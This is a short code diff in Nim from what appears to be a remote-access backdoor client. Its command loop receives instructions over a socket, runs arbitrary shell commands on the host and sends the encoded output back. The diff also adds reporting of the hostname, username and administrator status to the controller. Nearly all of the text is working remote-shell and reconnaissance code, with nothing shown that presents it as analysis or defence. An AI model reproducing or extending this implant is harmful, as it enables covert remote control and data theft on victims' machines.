@@ -19,13 +19,13 @@ proc receiveCommands(client: Socket) =
             quit(0)
         echo line
         if line == "hi":
-            client.send(&"INFO:{hostname()}:{username()}\r\n")
+            client.send(&"INFO:{hostname()}:{username()}:{areWeAdmin()}\r\n")
         if line.startsWith("CMD:"):
             # echo "executing: " & 
             let cmd = args[1..(argsn - 1)].join(":")
             try:
                 echo getCurrentDir()
-                var (output, _) = execCmdEx("cmd.exe /c " & cmd, workingDir = getCurrentDir())
+                var (output, _) = execCmdEx(cmd, workingDir = getCurrentDir())
                 client.send(&"OUTPUT:CMD:{encode(output)}\r\n")
             except OSError:
                 client.send(&"OUTPUT:CMD:{encode(getCurrentExceptionMsg())}\r\n")
